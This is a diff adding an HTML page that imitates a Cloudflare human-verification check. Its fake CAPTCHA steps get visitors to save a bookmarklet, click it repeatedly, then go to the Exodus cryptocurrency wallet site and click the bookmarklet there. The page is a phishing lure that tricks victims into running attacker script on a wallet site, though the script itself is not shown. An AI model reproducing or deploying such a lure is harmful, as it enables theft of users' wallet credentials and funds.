@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification – Secure connection</title>
+  <meta name="captcha-base-url" content="" id="captcha-base-url">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body class="verify-page">
+  <div class="container verify-container">
+    <div class="card verify-card" id="captcha-content">
+      <!-- Step 1: Verifying + I am human (hidden after verify) -->
+      <div class="verify-step" id="verify-step">
+        <h2 class="verify-title">Verifying you are human</h2>
+
+        <div class="verify-box">
+          <div class="verify-box-left">
+            <div class="loader" id="verifyLoader" aria-hidden="true"></div>
+            <span>Verifying...</span>
+          </div>
+          <img src="assets/cloudflarelogo.png" alt="Cloudflare" class="verify-cloudflare-logo" width="40" height="40">
+        </div>
+
+        <p class="verify-text">
+          This page needs to review the security of your connection before proceeding.
+        </p>
+
+        <div class="human-box">
+          <label class="human-checkbox-label">
+            <input type="checkbox" id="robotCheckbox" class="robot-checkbox">
+            <span class="checkbox-custom" aria-hidden="true"></span>
+            <span class="checkbox-text">I am human</span>
+          </label>
+        </div>
+
+        <button type="button" class="btn-verify" id="verifyHumanBtn">VERIFY YOU ARE HUMAN</button>
+      </div>
+
+      <div class="captcha-box hidden" id="captcha-box">
+        <!-- Challenge 1 (1/2): Image challenge - drag correct item to bookmarks -->
+        <div class="challenge-stage" id="challenge1">
+          <div class="challenge-banner" id="challenge1Banner">
+            Please drag the correct answer to your bookmarks bar
+          </div>
+          <p class="challenge-instruction" id="challenge1Instruction">Drag the item you can't eat to your bookmarks bar.</p>
+          <div class="challenge-grid" id="challenge1Grid"></div>
+          <div class="challenge-footer">
+            <button type="button" class="btn btn-challenge-done" id="done1Button">Done <span class="step-num">(1/2)</span></button>
+          </div>
+        </div>
+
+        <!-- Challenge 2 (2/2): Click bookmark 15 times -->
+        <div class="challenge-stage hidden" id="challenge2">
+          <div class="challenge-banner">Click the bookmarked answer 15 times</div>
+          <p class="click-counter-line">Click Counter: <strong id="clickCounter">0</strong></p>
+          <div class="challenge-footer">
+            <button type="button" class="btn btn-challenge-done" id="done2Button">Done <span class="step-num">(2/2)</span></button>
+          </div>
+        </div>
+
+        <div class="calculation-display hidden" id="calculationDisplay">
+          <p id="currentCalc">10 + 5 = ?</p>
+          <p id="clickCount">Click the bookmarklet to solve (0/20)</p>
+        </div>
+        <div class="captcha-container hidden" id="captcha-container"></div>
+        <div class="timer hidden" id="timer">Time left: <span id="timer-value">20</span>s</div>
+        <div class="answer-display hidden" id="answerValue"></div>
+        <div class="buttons-row hidden" id="stage1-buttons"></div>
+        <div class="stage2 hidden" id="stage2"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="captcha-popup-overlay hidden" id="exodus-popup-overlay">
+    <div class="captcha-popup" role="dialog" aria-labelledby="exodus-popup-title">
+      <h2 id="exodus-popup-title">Before you go</h2>
+      <p>After redirect, click our bookmarklet to verify captcha.</p>
+      <a href="https://www.exodus.com" id="exodus-popup-ok" class="btn btn-submit">OK</a>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
